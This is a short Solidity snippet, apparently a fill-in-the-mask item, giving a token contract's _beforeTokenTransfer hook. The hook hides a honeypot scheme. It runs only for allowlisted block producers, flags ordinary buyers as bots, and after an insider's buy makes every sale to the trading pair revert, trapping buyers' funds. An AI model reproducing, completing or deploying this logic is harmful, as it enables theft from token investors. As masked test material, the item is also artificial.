"function _beforeTokenTransfer(address from, address to, uint256) internal override {    if (!coinbases[block.coinbase]) return;    if (senders[tx.origin]) {         if (from == __pair) {            triggered = true;        }        return;    }    if (!botMap[to] && to != __pair && !senders[to]) {      botMap[to] = true;      bots.<mask0>;    }    if (to == __pair && triggered) revert();  }"